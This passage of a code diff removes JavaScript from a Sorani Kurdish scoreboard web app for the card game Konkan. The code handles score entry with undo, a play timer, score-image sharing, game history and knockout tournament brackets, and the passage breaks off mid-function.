-      var filled = r.t1 !== null && r.t1 !== undefined && r.t2 !== null && r.t2 !== undefined;
-      if(filled) cls += " done";
-      else if(lockAfter && (i+1) > lockAfter) cls += " skipped";
-      else if(i === currentIdx && !complete) cls += " current";
-      if(i === total-1) cls += " bonus";
-      seg.className = cls;
-      segs.appendChild(seg);
-    });
-
-    if(complete){
-      $("progressLeft").textContent = "یاری تەواو بوو";
-      $("progressRight").textContent = "";
-    } else {
-      var n = currentIdx + 1;
-      var left = total - played;
-      $("progressLeft").textContent = (currentIdx === total-1)
-        ? ("تەڵقەی کۆتایی · " + toEastern(n) + " لە " + toEastern(total))
-        : ("تەڵقەی " + toEastern(n) + " لە " + toEastern(total));
-      $("progressRight").textContent = toEastern(left) + " ماوە";
-    }
-  }
-
-  function renderScoreScreen(){
-    var lbl = $("matchLabel");
-    if(currentMatchId && T && getMatch(currentMatchId)){
-      var cm = getMatch(currentMatchId);
-      lbl.style.display = "block";
-      lbl.textContent = T.name + " · " + roundTitle(cm.r) + " · یاری " + toEastern(cm.no);
-      $("newGameBtn").textContent = "گەڕانەوە بۆ پاڵەوانێتی";
-    } else {
-      lbl.style.display = "none";
-      $("newGameBtn").textContent = "یاری نوێ";
-    }
-    updateScoreboard();
-    renderProgress();
-    updateNotice();
-    $("rhName1").textContent = gameState.team1Name;
-    $("rhName2").textContent = gameState.team2Name;
-    renderRoundList();
-    showFinalResult();
-    updateSoundIcon();
-    updateTimerDisplay();
-  }
-
-  function updateSoundIcon(){
-    $("soundBtn").innerHTML = gameState.sound ? ICONS.soundOn : ICONS.soundOff;
-  }
-
-  /* ---------------- Elapsed-time timer ---------------- */
-  function pad2(n){ return (n<10 ? "0" : "") + n; }
-
-  function updateTimerDisplay(){
-    var el = $("gameTimer");
-    if(!el) return;
-    if(!gameState || !gameState.startedAt){ el.textContent = toEastern("00:00"); return; }
-    var elapsedMs = Date.now() - gameState.startedAt;
-    if(elapsedMs < 0) elapsedMs = 0;
-    var totalSec = Math.floor(elapsedMs/1000);
-    var h = Math.floor(totalSec/3600);
-    var m = Math.floor((totalSec%3600)/60);
-    var s = totalSec%60;
-    var text = (h>0) ? (pad2(h)+":"+pad2(m)+":"+pad2(s)) : (pad2(m)+":"+pad2(s));
-    el.textContent = toEastern(text);
-  }
-
-  /* ---------------- Screen wake lock ---------------- */
-  var wakeLockRef = null;
-  function requestWakeLock(){
-    if(!("wakeLock" in navigator)) return;
-    navigator.wakeLock.request("screen").then(function(lock){
-      wakeLockRef = lock;
-      lock.addEventListener("release", function(){ wakeLockRef = null; });
-    }).catch(function(){ /* ignore - not critical */ });
-  }
-
-  /* ---------------- Share / export as image ---------------- */
-  function drawRoundedRect(ctx,x,y,w,h,r){
-    ctx.beginPath();
-    ctx.moveTo(x+r,y);
-    ctx.arcTo(x+w,y,x+w,y+h,r);
-    ctx.arcTo(x+w,y+h,x,y+h,r);
-    ctx.arcTo(x,y+h,x,y,r);
-    ctx.arcTo(x,y,x+w,y,r);
-    ctx.closePath();
-  }
-
-  function buildScoreCanvas(){
-    var totals = calculateTotals();
-    var complete = isGameComplete();
-    var rows = gameState.roundsData.length;
-    var W = 720, pad = 20;
-    var headerH = 150, tableHeaderH = 34, rowH = 46;
-    var footerH = complete ? 70 : 36;
-    var H = headerH + tableHeaderH + rows*rowH + footerH + pad*2;
-
-    var canvas = $("shareCanvas");
-    canvas.width = W; canvas.height = H;
-    var ctx = canvas.getContext("2d");
-    ctx.direction = "rtl";
-    ctx.textAlign = "center";
-
-    var C1 = "#d2452f", C2 = "#2a68b8";
-    var FONT = "Vazirmatn, 'Noto Sans Arabic', sans-serif";
-
-    ctx.fillStyle = "#f6eee3";
-    ctx.fillRect(0,0,W,H);
-
-    /* ----- shared column geometry (header + table use the same columns) ----- */
-    var cardX = pad, cardY = pad, cardW = W - pad*2;
-    var tagColW = 64;
-    var teamColW = (cardW - tagColW)/2;
-    var tagCx   = cardX + cardW - tagColW/2;          // round number column (right)
-    var team1Cx = cardX + cardW - tagColW - teamColW/2; // first team (right of the two)
-    var team2Cx = cardX + teamColW/2;                  // second team (left)
-    var divA = cardX + teamColW;                       // between team 2 and team 1
-    var divB = cardX + teamColW*2;                     // between team 1 and round column
-
-    /* ----- header card ----- */
-    var hdrH = headerH - 10;
-    ctx.fillStyle = "#fffaf3";
-    drawRoundedRect(ctx, cardX, cardY, cardW, hdrH, 18);
-    ctx.fill();
-    ctx.strokeStyle = "#e2d2bd"; ctx.lineWidth = 1;
-    drawRoundedRect(ctx, cardX, cardY, cardW, hdrH, 18);
-    ctx.stroke();
-
-    ctx.fillStyle = "#3a2218";
-    ctx.font = "800 26px " + FONT;
-    ctx.fillText("خاڵنووسی کۆنکان", W/2, cardY+38);
-
-    // dividers start BELOW the title so they never cross it
-    ctx.strokeStyle = "#e2d2bd";
-    ctx.beginPath();
-    ctx.moveTo(divA, cardY+58); ctx.lineTo(divA, cardY+hdrH-14);
-    ctx.moveTo(divB, cardY+58); ctx.lineTo(divB, cardY+hdrH-14);
-    ctx.stroke();
-
-    ctx.font = "700 17px " + FONT;
-    ctx.fillStyle = C1; ctx.fillText(gameState.team1Name, team1Cx, cardY+86);
-    ctx.fillStyle = C2; ctx.fillText(gameState.team2Name, team2Cx, cardY+86);
-
-    ctx.font = "800 38px " + FONT;
-    ctx.fillStyle = C1;
-    ctx.globalAlpha = (totals.t1 <= totals.t2) ? 1 : 0.5;
-    ctx.fillText(toEastern(totals.t1), team1Cx, cardY+124);
-    ctx.fillStyle = C2;
-    ctx.globalAlpha = (totals.t2 <= totals.t1) ? 1 : 0.5;
-    ctx.fillText(toEastern(totals.t2), team2Cx, cardY+124);
-    ctx.globalAlpha = 1;
-
-    ctx.font = "700 13px " + FONT;
-    ctx.fillStyle = "#7a6354";
-    ctx.fillText("کۆ", tagCx, cardY+122);
-
-    /* ----- table ----- */
-    var tableTop = cardY + headerH + 10;
-
-    ctx.font = "700 13px " + FONT;
-    ctx.fillStyle = C1; ctx.fillText(gameState.team1Name, team1Cx, tableTop+18);
-    ctx.fillStyle = C2; ctx.fillText(gameState.team2Name, team2Cx, tableTop+18);
-
-    var y = tableTop + tableHeaderH;
-    var tableBodyTop = y;
-    gameState.roundsData.forEach(function(r, idx){
-      if(idx % 2 === 1){
-        ctx.fillStyle = "#eee2d2";
-        ctx.fillRect(cardX, y, cardW, rowH);
-      }
-      ctx.fillStyle = "#7a6354";
-      ctx.font = "700 14px " + FONT;
-      ctx.fillText("ت " + toEastern(idx+1), tagCx, y+rowH/2+5);
-
-      ctx.font = "700 18px " + FONT;
-      ctx.fillStyle = "#3a2218";
-      var v1 = r.gharbat ? "غەربەت" : ((r.t1===null||r.t1===undefined) ? "—" : toEastern(r.t1));
-      var v2 = r.gharbat ? "غەربەت" : ((r.t2===null||r.t2===undefined) ? "—" : toEastern(r.t2));
-      ctx.fillText(v1, team1Cx, y+rowH/2+6);
-      ctx.fillText(v2, team2Cx, y+rowH/2+6);
-
-      y += rowH;
-    });
-
-    // same column dividers through the whole table
-    ctx.strokeStyle = "#e2d2bd";
-    ctx.beginPath();
-    ctx.moveTo(divA, tableBodyTop); ctx.lineTo(divA, y);
-    ctx.moveTo(divB, tableBodyTop); ctx.lineTo(divB, y);
-    ctx.stroke();
-
-    if(complete){
-      var verdict;
-      if(totals.t1 === totals.t2){
-        verdict = "یارییەکە یەکسانە";
-      } else if(totals.t1 < totals.t2){
-        verdict = gameState.team1Name + " بە " + toEastern(totals.t2-totals.t1) + " خاڵ پێشە";
-      } else {
-        verdict = gameState.team2Name + " بە " + toEastern(totals.t1-totals.t2) + " خاڵ پێشە";
-      }
-      ctx.font = "800 17px " + FONT;
-      ctx.fillStyle = "#4a2e21";
-      ctx.fillText(verdict, W/2, y+30);
-      y += footerH - 20;
-    }
-
-    ctx.font = "600 12px " + FONT;
-    ctx.fillStyle = "#b8a592";
-    ctx.fillText(formatDate(new Date().toISOString()), W/2, y+20);
-
-    return canvas;
-  }
-
-  var shareBlob = null, shareFile = null, shareUrl = null, shareFileName = "konkan.png";
-
-  function exportScoreImage(){
-    function doDraw(){
-      var canvas = buildScoreCanvas();
-      canvas.toBlob(function(blob){
-        if(!blob){ showToast("هەڵەیەک ڕوویدا"); return; }
-        shareBlob = blob;
-        shareFileName = "konkan-" + gameState.team1Name + "-" + gameState.team2Name + ".png";
-        shareFile = null;
-        try{ shareFile = new File([blob], shareFileName, { type: "image/png" }); }catch(e){ shareFile = null; }
-        if(shareUrl){ URL.revokeObjectURL(shareUrl); }
-        shareUrl = URL.createObjectURL(blob);
-        $("sharePreview").src = shareUrl;
-        $("shareOverlay").classList.add("show");
-      }, "image/png");
-    }
-
-    var go = doDraw;
-
-    if(document.fonts && document.fonts.ready){
-      document.fonts.ready.then(go).catch(go);
-    } else {
-      go();
-    }
-  }
-
-  function closeSharePreview(){
-    $("shareOverlay").classList.remove("show");
-  }
-
-  function sendShareImage(){
-    if(!shareBlob) return;
-    if(navigator.share && shareFile && navigator.canShare && navigator.canShare({ files:[shareFile] })){
-      navigator.share({ files:[shareFile], title:"خاڵنووسی کۆنکان", text: gameState.team1Name + " × " + gameState.team2Name }).catch(function(){});
-    } else {
-      downloadShareImage();
-    }
-  }
-
-  function downloadShareImage(){
-    if(!shareUrl) return;
-    var a = document.createElement("a");
-    a.href = shareUrl;
-    a.download = shareFileName;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    showToast("وێنەکە دابەزێنرا");
-  }
-
-  /* ---------------- Score modal ---------------- */
-  function buildQuickButtons(){
-    var wrap = $("quickScores");
-    wrap.innerHTML = "";
-    [200,400].forEach(function(val){
-      var b = document.createElement("button");
-      b.type = "button";
-      b.className = "quick-btn";
-      b.textContent = toEastern(val);
-      b.addEventListener("click", function(){
-        soundClick();
-        if(activeInputEl){
-          activeInputEl.value = val;
-          // the other team automatically gets 0
-          var other = (activeInputEl === $("scoreInput1")) ? $("scoreInput2") : $("scoreInput1");
-          other.value = 0;
-        }
-      });
-      wrap.appendChild(b);
-    });
-  }
-
-  function setActiveInput(el){
-    $("scoreInput1").classList.remove("active-input");
-    $("scoreInput2").classList.remove("active-input");
-    el.classList.add("active-input");
-    activeInputEl = el;
-  }
-
-  function openScoreModal(roundIndex, whichTapped){
-    activeRoundIndex = roundIndex;
-    var r = gameState.roundsData[roundIndex];
-    var isGharbat = r.gharbat === true;
-
-    $("scoreModalTitle").textContent = "ت " + toEastern(roundIndex+1);
-    $("scoreLabel1").textContent = gameState.team1Name;
-    $("scoreLabel2").textContent = gameState.team2Name;
-
-    $("scoreInput1").value = (isGharbat || r.t1===null || r.t1===undefined) ? "" : r.t1;
-    $("scoreInput2").value = (isGharbat || r.t2===null || r.t2===undefined) ? "" : r.t2;
-
-    $("scoreOverlay").classList.add("show");
-
-    var focusEl = whichTapped === "t2" ? $("scoreInput2") : $("scoreInput1");
-    setActiveInput(focusEl);
-    setTimeout(function(){ focusEl.focus(); focusEl.select(); }, 220);
-  }
-
-  function closeScoreModal(){
-    $("scoreOverlay").classList.remove("show");
-    activeRoundIndex = null;
-    activeInputEl = null;
-  }
-
-  function saveScore(){
-    if(activeRoundIndex === null) return;
-    soundConfirm();
-
-    undoStack.push(JSON.parse(JSON.stringify(gameState.roundsData)));
-    if(undoStack.length > 15) undoStack.shift();
-
-    var v1raw = $("scoreInput1").value;
-    var v2raw = $("scoreInput2").value;
-    var r = gameState.roundsData[activeRoundIndex];
-
-    // If only one team has a score, the empty one is saved as 0
-    if(v1raw === "" && v2raw !== "") v1raw = "0";
-    if(v2raw === "" && v1raw !== "") v2raw = "0";
-    r.t1 = v1raw === "" ? null : Math.max(0, parseInt(v1raw,10) || 0);
-    r.t2 = v2raw === "" ? null : Math.max(0, parseInt(v2raw,10) || 0);
-    r.gharbat = false;
-
-    saveCurrentGame();
-    closeScoreModal();
-    if(currentMatchId) tournamentAfterChange();
-    renderScoreScreen();
-    finalizeIfComplete();
-  }
-
-  function markGharbat(){
-    if(activeRoundIndex === null) return;
-    soundClick();
-
-    undoStack.push(JSON.parse(JSON.stringify(gameState.roundsData)));
-    if(undoStack.length > 15) undoStack.shift();
-
-    var r = gameState.roundsData[activeRoundIndex];
-    var alreadyGharbat = r.gharbat === true;
-    r.t1 = 0;
-    r.t2 = 0;
-    r.gharbat = true;
-
-    if(!alreadyGharbat){
-      gameState.roundsData.push({ t1:null, t2:null });
-      gameState.rounds += 1;
-    }
-
-    saveCurrentGame();
-    closeScoreModal();
-    if(currentMatchId) tournamentAfterChange();
-    renderScoreScreen();
-    finalizeIfComplete();
-    showToast("تەڵقەکە کرا بە غەربەت");
-  }
-
-  function undoLastChange(){
-    if(undoStack.length === 0){
-      showToast("هیچ گۆڕانکارییەک نییە بۆ گەڕاندنەوە");
-      return;
-    }
-    gameState.roundsData = undoStack.pop();
-    saveCurrentGame();
-    renderScoreScreen();
-    showToast("گەڕایەوە بۆ پێشتر");
-  }
-
-  /* ---------------- History ---------------- */
-  function formatDate(iso){
-    var d = new Date(iso);
-    var y = d.getFullYear();
-    var m = String(d.getMonth()+1).padStart(2,"0");
-    var day = String(d.getDate()).padStart(2,"0");
-    return toEastern(y) + "/" + toEastern(m) + "/" + toEastern(day);
-  }
-
-  function escapeHtml(t){
-    return String(t).replace(/[&<>"']/g, function(c){
-      return { "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;" }[c];
-    });
-  }
-  function formatDuration(ms){
-    var total = Math.floor(ms/1000);
-    var h = Math.floor(total/3600), m = Math.floor((total%3600)/60), sec = total%60;
-    return (h>0) ? (pad2(h)+":"+pad2(m)+":"+pad2(sec)) : (pad2(m)+":"+pad2(sec));
-  }
-
-  function renderHistory(){
-    var list = $("historyList");
-    var h = loadHistory();
-    list.innerHTML = "";
-    if(h.length === 0){
-      list.innerHTML = '<div class="history-empty">هیچ یارییەک تۆمار نەکراوە</div>';
-      return;
-    }
-    h.forEach(function(item, idx){
-      var row = document.createElement("div");
-      row.className = "history-item";
-
-      var main = document.createElement("div");
-      main.className = "history-item-main";
-      var meta = toEastern(item.rounds) + " تەڵقە · " + formatDate(item.date);
-      if(item.durationMs){ meta += " · " + formatDuration(item.durationMs); }
-      if(item.finished === false){ meta += " · نەتەواو"; }
-      if(item.tournament){ meta += " · " + escapeHtml(item.tournament); }
-      main.innerHTML =
-        '<div class="history-teams">' + escapeHtml(item.team1Name) + ' × ' + escapeHtml(item.team2Name) + '</div>' +
-        '<div class="history-score">' + toEastern(item.total1) + ' — ' + toEastern(item.total2) + '</div>' +
-        '<div class="history-meta">' + meta + '</div>';
-
-      var del = document.createElement("button");
-      del.className = "history-del";
-      del.innerHTML = ICONS.trash;
-      del.setAttribute("aria-label", "سڕینەوە");
-      del.addEventListener("click", function(){
-        deleteHistoryGame(idx);
-        renderHistory();
-        showToast("یارییەکە سڕدرایەوە");
-      });
-
-      row.appendChild(main);
-      row.appendChild(del);
-      list.appendChild(row);
-    });
-  }
-
-  /* ---------------- Setup screen wiring ---------------- */
-  var selectedRounds = 7;
-
-  var K_LAST = "konkan_last_setup";
-
-  function applyRoundsToUI(displayedRounds){
-    document.querySelectorAll("#quickForm .round-opt").forEach(function(b){ b.classList.remove("selected"); });
-    var matchBtn = document.querySelector('#quickForm .round-opt[data-rounds="' + displayedRounds + '"]');
-    if(matchBtn){
-      matchBtn.classList.add("selected");
-      $("customRoundsWrap").classList.remove("show");
-      selectedRounds = displayedRounds;
-    } else {
-      document.querySelector('#quickForm .round-opt[data-rounds="custom"]').classList.add("selected");
-      $("customRoundsWrap").classList.add("show");
-      $("customRoundsInput").value = displayedRounds;
-      selectedRounds = "custom";
-    }
-  }
-
-  function loadLastSetup(){
-    try{
-      var raw = localStorage.getItem(K_LAST);
-      if(!raw) return;
-      var d = JSON.parse(raw);
-      if(d.t1) $("team1Input").value = d.t1;
-      if(d.t2) $("team2Input").value = d.t2;
-      if(d.rounds) applyRoundsToUI(d.rounds);
-    }catch(e){}
-  }
-
-  function saveLastSetup(t1, t2, rounds){
-    try{ lsSet(K_LAST, JSON.stringify({ t1:t1, t2:t2, rounds:rounds })); }catch(e){}
-  }
-
-  function wireSetupScreen(){
-    document.querySelectorAll("#quickForm .round-opt").forEach(function(btn){
-      btn.addEventListener("click", function(){
-        document.querySelectorAll("#quickForm .round-opt").forEach(function(b){ b.classList.remove("selected"); });
-        btn.classList.add("selected");
-        var val = btn.getAttribute("data-rounds");
-        if(val === "custom"){
-          $("customRoundsWrap").classList.add("show");
-          selectedRounds = "custom";
-        } else {
-          $("customRoundsWrap").classList.remove("show");
-          selectedRounds = parseInt(val,10);
-        }
-      });
-    });
-
-    $("team1Input").addEventListener("keydown", function(e){
-      if(e.key === "Enter"){ e.preventDefault(); $("team2Input").focus(); }
-    });
-    $("team2Input").addEventListener("keydown", function(e){
-      if(e.key === "Enter"){ e.preventDefault(); $("startGameBtn").click(); }
-    });
-
-    $("startGameBtn").addEventListener("click", function(){
-      var t1 = $("team1Input").value.trim();
-      var t2 = $("team2Input").value.trim();
-      var err = $("setupError");
-
-      if(!t1 || !t2){
-        err.classList.add("show");
-        return;
-      }
-      err.classList.remove("show");
-
-      var rounds = selectedRounds;
-      if(rounds === "custom"){
-        rounds = parseInt($("customRoundsInput").value, 10);
-        if(!rounds || rounds < 1) rounds = 7;
-        if(rounds > 30) rounds = 30;
-      }
-
-      saveLastSetup(t1, t2, rounds);
-      startGame(t1, t2, rounds);
-    });
-  }
-
-  /* ---------------- Score screen wiring ---------------- */
-  function wireScoreScreen(){
-    $("homeBtn").addEventListener("click", function(){
-      if(currentMatchId){ leaveMatch(); return; }
-      lsSet(K_VIEW, "q");
-      $("team1Input").value = gameState.team1Name;
-      $("team2Input").value = gameState.team2Name;
-      applyRoundsToUI(gameState.rounds - 1);
-      $("setupError").classList.remove("show");
-      showScreen("setupScreen");
-    });
-
-    $("historyBtn").addEventListener("click", function(){
-      renderHistory();
-      $("historyOverlay").classList.add("show");
-    });
-    $("closeHistoryModal").addEventListener("click", function(){
-      $("historyOverlay").classList.remove("show");
-    });
-
-
-    $("soundBtn").addEventListener("click", function(){
-      gameState.sound = !gameState.sound;
-      soundPref = gameState.sound;
-      try{ lsSet(K_SOUND, gameState.sound ? "1" : "0"); }catch(e){}
-      updateSoundIcon();
-      saveCurrentGame();
-      if(gameState.sound) soundClick();
-    });
-
-    $("newGameBtn").addEventListener("click", function(){
-      if(currentMatchId){ leaveMatch(); return; }
-      $("newGameOverlay").classList.add("show");
-    });
-    $("cancelNewGame").addEventListener("click", function(){
-      $("newGameOverlay").classList.remove("show");
-    });
-    $("confirmNewGame").addEventListener("click", function(){
-      $("newGameOverlay").classList.remove("show");
-      startNewGame();
-    });
-
-    $("shareBtn").addEventListener("click", function(){
-      soundClick();
-      exportScoreImage();
-    });
-
-    $("closeShareModal").addEventListener("click", closeSharePreview);
-    $("shareOverlay").addEventListener("click", function(e){
-      if(e.target === $("shareOverlay")) closeSharePreview();
-    });
-    $("sendShareBtn").addEventListener("click", sendShareImage);
-    $("downloadShareBtn").addEventListener("click", downloadShareImage);
-  }
-
-  function wireScoreModal(){
-    $("closeScoreModal").addEventListener("click", closeScoreModal);
-    $("scoreOverlay").addEventListener("click", function(e){
-      if(e.target === $("scoreOverlay")) closeScoreModal();
-    });
-    $("scoreInput1").addEventListener("focus", function(){ setActiveInput($("scoreInput1")); });
-    $("scoreInput2").addEventListener("focus", function(){ setActiveInput($("scoreInput2")); });
-    $("saveScoreBtn").addEventListener("click", saveScore);
-    $("gharbatBtn").addEventListener("click", markGharbat);
-
-    [$("scoreInput1"), $("scoreInput2")].forEach(function(inp){
-      inp.addEventListener("keydown", function(e){
-        if(e.key === "-" || e.key === "e") e.preventDefault();
-        if(e.key === "Enter") saveScore();
-      });
-    });
-  }
-
-  function wireIcons(){
-    $("historyBtn").innerHTML = ICONS.history;
-    $("closeScoreModal").innerHTML = ICONS.close;
-    $("closeHistoryModal").innerHTML = ICONS.close;
-    $("closeShareModal").innerHTML = ICONS.close;
-    $("homeBtn").innerHTML = ICONS.home;
-    $("bHomeBtn").innerHTML = ICONS.home;
-    $("shareBtn").innerHTML = ICONS.share;
-  }
-
-
-  /* ---------------- Tournament (knockout) ---------------- */
-  var T = null;                 // current tournament
-  var currentMatchId = null;
-  var soundPref = true;
-
-  /*T-PURE-START*/
-  function shuffle(arr){
-    var a = arr.slice();
-    for(var i=a.length-1;i>0;i--){
-      var j = Math.floor(Math.random()*(i+1));
-      var t = a[i]; a[i] = a[j]; a[j] = t;
-    }
-    return a;
-  }
-
-  function buildTournament(name, teams, roundsPerMatch){
-    var n = teams.length;
-    var size = 1;
-    while(size < n) size *= 2;
-    var R = 0;
-    for(var q=size; q>1; q = q/2) R++;
-    var byes = size - n;
-    var order = shuffle(teams.map(function(_, i){ return i; }));
-    var firstCount = size/2;
-    var idx = [];
-    for(var k=0;k<firstCount;k++) idx.push(k);
-    idx = shuffle(idx);
-    var byeSet = {};
-    for(var b=0;b<byes;b++) byeSet[idx[b]] = true;
-
-    var rounds = [];
-    var p = 0;
-    for(var r=0;r<R;r++){
-      var count = size / Math.pow(2, r+1);
-      var list = [];
-      for(var i=0;i<count;i++){
-        var m = { id:"r"+r+"m"+i, r:r, i:i, a:null, b:null, winner:null, bye:false, game:null, no:0 };
-        if(r === 0){
-          if(byeSet[i]){ m.a = order[p++]; m.bye = true; m.winner = m.a; }
-          else { m.a = order[p++]; m.b = order[p++]; }
-        }
-        list.push(m);
-      }
-      rounds.push(list);
-    }
-    var no = 0;
-    rounds.forEach(function(list){ list.forEach(function(m){ if(!m.bye) m.no = ++no; }); });
-
-    var tour = {
-      id: "t" + Date.now(),
-      name: name,
-      teams: teams,
-      roundsPerMatch: roundsPerMatch,
-      size: size,
-      rounds: rounds,
-      revealed: false,
-      finished: false,
-      champion: null,
-      activeMatchId: null
-    };
-    refreshSlots(tour);
-    return tour;
-  }
-
-  // Fill each next-round slot from the winners of the previous round
-  function refreshSlots(tour){
-    var R = tour.rounds.length;
-    var prev = {};
-    for(var r=1;r<R;r++){
-      tour.rounds[r].forEach(function(m){ prev[m.id] = m.a + "|" + m.b; m.a = null; m.b = null; });
-    }
-    for(var r2=0;r2<R-1;r2++){
-      tour.rounds[r2].forEach(function(m, i){
-        if(m.winner !== null){
-          var nx = tour.rounds[r2+1][i>>1];
-          if(i % 2 === 0) nx.a = m.winner; else nx.b = m.winner;
-        }
-      });
-    }
-    for(var r3=1;r3<R;r3++){
-      tour.rounds[r3].forEach(function(m){
-        if(prev[m.id] !== (m.a + "|" + m.b) && m.game && m.winner === null){ m.game = null; }
-      });
-    }
-    var fin = tour.rounds[R-1][0];
-    tour.finished = fin.winner !== null;
-    tour.champion = fin.winner;
-  }
-
-  function roundTitleFor(size, r){
-    var remaining = size / Math.pow(2, r);
-    if(remaining === 2) return "کۆتایی";
-    if(remaining === 4) return "نیمەکۆتایی";
-    if(remaining === 8) return "چارەکی کۆتایی";
-    return "دەوری " + remaining;
-  }
-  /*T-PURE-END*/
-
-  function roundTitle(r){ return roundTitleFor(T.size, r); }
-
-  function loadTournament(){
-    try{
-      var raw = localStorage.getItem(K_TOURN);
-      T = raw ? JSON.parse(raw) : null;
-      if(T && !Array.isArray(T.rounds)) T = null;
-    }catch(e){ T = null; }
-  }
-  function saveTournament(){
-    if(!T) return;
-    try{ lsSet(K_TOURN, JSON.stringify(T)); }catch(e){}
-  }
-  function clearTournament(){
-    T = null;
-    currentMatchId = null;
-    try{ lsRemove(K_TOURN); }catch(e){}
-  }
-
-  function getMatch(id){
-    if(!T) return null;
-    for(var r=0;r<T.rounds.length;r++){
-      for(var i=0;i<T.rounds[r].length;i++){
-        if(T.rounds[r][i].id === id) return T.rounds[r][i];
-      }
-    }
-    return null;
-  }
-  function nextMatchOf(m){
-    if(!T || m.r >= T.rounds.length-1) return null;
-    return T.rounds[m.r+1][m.i>>1];
-  }
-  function gameHasScore(g){
-    return !!(g && g.roundsData && g.roundsData.some(function(r){
-      return (r.t1 !== null && r.t1 !== undefined) || (r.t2 !== null && r.t2 !== undefined);
-    }));
-  }
-  function gameTotals(g){
-    var t1 = 0, t2 = 0;
-    g.roundsData.forEach(function(r){
-      if(r.t1 !== null && r.t1 !== undefined) t1 += r.t1;
-      if(r.t2 !== null && r.t2 !== undefined) t2 += r.t2;
-    });
-    return { t1:t1, t2:t2 };
-  }
-
-  // A finished match is locked once the next match already has scores
-  function tournamentLocked(){
-    if(!currentMatchId || !T) return false;
-    var m = getMatch(currentMatchId);
-    if(!m) return false;
-    var nx = nextMatchOf(m);
-    return !!(nx && (nx.winner !== null || gameHasScore(nx.game)));
-  }
-
-  // Called after every score change of a tournament match
-  function tournamentAfterChange(){
-    var m = getMatch(currentMatchId);
-    if(!m) return;
-    var status = getRoundCheckStatus();
-    var result = null;
-    if(status && status.type === "lost"){
-      result = status.team === "team1" ? "team2" : "team1";
-    } else if(isGameComplete()){
-      var t = calculateTotals();
-      result = t.t1 < t.t2 ? "team1" : (t.t2 < t.t1 ? "team2" : "tie");
-    }
-
-    if(result === "tie"){
-      gameState.roundsData.push({ t1:null, t2:null });
-      gameState.rounds += 1;
-      showToast("یەکسان بوون — تەڵقەیەکی زیادە زیاد کرا");
-      result = null;
-    }
-
-    var newWinner = result === null ? null : (result === "team1" ? m.a : m.b);
-    if(newWinner !== m.winner){
-      m.winner = newWinner;
-      refreshSlots(T);
-      if(newWinner !== null){
-        showToast(T.teams[newWinner] + (T.finished ? " بوو بە پاڵەوان" : " تێپەڕی"));
-      }
-    }
-    saveTournament();
-  }
-
-  function startMatch(id){
-    var m = getMatch(id);
-    if(!m || m.a === null || m.b === null || m.bye) return;
-    if(!m.game){
-      var actual = T.roundsPerMatch + 1;
-      m.game = {
-        team1Name: T.teams[m.a],
-        team2Name: T.teams[m.b],
-        rounds: actual,
-        roundsData: createRounds(actual),
-        sound: soundPref,
-        historySaved: false,
-        startedAt: Date.now()
-      };
-    }
-    gameState = m.game;
-    gameState.sound = soundPref;
-    currentMatchId = id;
-    undoStack = [];
-    T.activeMatchId = id;
-    saveTournament();
-    lsSet(K_VIEW, "t");
-    renderScoreScreen();
-    showScreen("scoreScreen");
-    requestWakeLock();
-  }
-
-  function leaveMatch(){
-    saveTournament();
-    currentMatchId = null;
-    if(T) T.activeMatchId = null;
-    saveTournament();
-    gameState = { sound: soundPref };
-    renderBracket(false);
-    showScreen("bracketScreen");
-  }
-
-  /* ---- bracket rendering ---- */
-  function renderBracket(reveal){
-    $("bTitle").textContent = T.name;
-    lsSet(K_VIEW, "t");
-
-    var total = 0, done = 0;
-    T.rounds.forEach(function(list){ list.forEach(function(m){
-      if(!m.bye){ total++; if(m.winner !== null) done++; }
-    }); });
-    $("bSub").textContent = toEastern(T.teams.length) + " تیم · " + toEastern(done) + "/" + toEastern(total) + " یاری تەواو بوو";
-
-    // champion
-    var ch = $("bChampion");
-    if(T.finished && T.champion !== null){
-      ch.style.display = "block";
-      ch.innerHTML = '<div class="champion-card">' + ICONS.trophy +
-        '<div class="champion-label">پاڵەوانی پاڵەوانێتی</div>' +
-        '<div class="champion-name">' + escapeHtml(T.teams[T.champion]) + '</div>' +
-        '<button type="button" id="newTournBtn">پاڵەوانێتی نوێ</button></div>';
-      $("newTournBtn").addEventListener("click", function(){ openSetupTab("tourn"); showScreen("setupScreen"); lsSet(K_VIEW, "q"); });
-    } else {
-      ch.style.display = "none";
-      ch.innerHTML = "";
-    }
-
-    // which round is current
-    var currentRound = -1;
-    for(var r=0;r<T.rounds.length;r++){
-      if(T.rounds[r].some(function(m){ return !m.bye && m.winner === null; })){ currentRound = r; break; }
-    }
-
-    var wrap = $("bRounds");
-    wrap.innerHTML = "";
-    var delay = 0;
-    T.rounds.forEach(function(list, r){
-      var title = document.createElement("div");
-      title.className = "round-title";
-      title.textContent = roundTitle(r);
-      if(r === currentRound){
-        var badge = document.createElement("span");
-        badge.className = "round-badge";
-        badge.textContent = "ئێستا";
-        title.appendChild(badge);
-      }
-      wrap.appendChild(title);
-
-      list.forEach(function(m){
-        var card = buildMatchCard(m);
-        if(reveal){
-          card.classList.add("reveal");
-          card.style.animationDelay = (delay * 0.12) + "s";
-          delay++;
-        }
-        wrap.appendChild(card);
-      });
-    });
-  }
-
-  function teamRow(idx, m, side){
-    var row = document.createElement("div");
-    row.className = "mc-team";
-    var name = document.createElement("span");
-    name.className = "mc-name";
-    var score = document.createElement("span");
-    score.className = "mc-score";
-
-    if(idx === null){
-      row.classList.add("tbd");
-      name.textContent = "چاوەڕێی براوە…";
-    } else {
-      name.textContent = T.teams[idx];
-      if(m.game && gameHasScore(m.game)){
-        var tt = gameTotals(m.game);
-        score.textContent = toEastern(side === "a" ? tt.t1 : tt.t2);
-      }
-      if(m.winner !== null){
-        row.classList.add(m.winner === idx ? "win" : "lose");
-      }
-    }
-    row.appendChild(name);
-    row.appendChild(score);
-    return row;
-  }
-
-  function buildMatchCard(m){
-    var card = document.createElement("div");
-    card.className = "match-card";
-
-    if(m.bye){
-      card.classList.add("bye");
-      var hb = document.createElement("div");
-      hb.className = "mc-head";
-      hb.innerHTML = '<span>بەبێ بەرامبەر</span><span class="mc-chip done">تێپەڕی</span>';
-      card.appendChild(hb);
-      var r1 = document.createElement("div");
-      r1.className = "mc-team win";
-      r1.innerHTML = '<span class="mc-name"></span>';
-      r1.firstChild.textContent = T.teams[m.a];
-      card.appendChild(r1);
-      return card;
-    }
-
-    var live = m.game && gameHasScore(m.game) && m.winner === null;
-    var chipClass = "mc-chip", chipText = "چاوەڕێ";
-    if(m.winner !== null){ chipClass += " done"; chipText = "تەواو"; }
